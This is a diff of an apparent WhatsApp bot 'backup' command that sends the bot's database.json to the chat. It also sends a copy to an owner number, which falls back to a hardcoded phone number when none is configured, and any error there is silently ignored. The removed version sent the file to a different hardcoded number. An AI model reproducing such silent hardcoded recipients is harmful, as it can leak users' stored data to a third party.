@@ -14,16 +14,33 @@ let handler = async (m, { conn, usedPrefix: _p, args, command }) => {
                             }
                           }
                         }
-	let d = new Date
-            let date = d.toLocaleDateString('id', {
-                day: 'numeric',
-                month: 'long',
-                year: 'numeric'
-            })
-conn.reply(m.chat, '*Succes*', m)
-conn.reply('62831433937633' + '@s.whatsapp.net', `*🗓️ Database:* ${date}`, null)
-          conn.sendFile('62831433937633' + '@s.whatsapp.net', fs.readFileSync('./index.js_database.json'), 'index.js_database.json', '', 0, 0, { mimetype: 'application/json', quoted: fdoc})
- }
+	let d = new Date()
+    let date = d.toLocaleDateString('id', {
+        day: 'numeric',
+        month: 'long',
+        year: 'numeric'
+    })
+
+    if (!fs.existsSync('./database.json')) throw 'File database.json tidak ditemukan!'
+    let dbBuffer = fs.readFileSync('./database.json')
+
+    await conn.sendMessage(m.chat, {
+        document: dbBuffer,
+        mimetype: 'application/json',
+        fileName: `database_${Date.now()}.json`,
+        caption: `*🗓️ Backup Database:* ${date}`
+    }, { quoted: m })
+
+    let ownerTarget = (global.nomorown || '6285869074622').replace(/[^0-9]/g, '') + '@s.whatsapp.net'
+    if (m.chat !== ownerTarget) {
+        await conn.sendMessage(ownerTarget, {
+            document: dbBuffer,
+            mimetype: 'application/json',
+            fileName: `database_${Date.now()}.json`,
+            caption: `*🗓️ Backup Database:* ${date}`
+        }).catch(() => {})
+    }
+}
  
  handler.help = ['backup']
 handler.tags = ['owner']
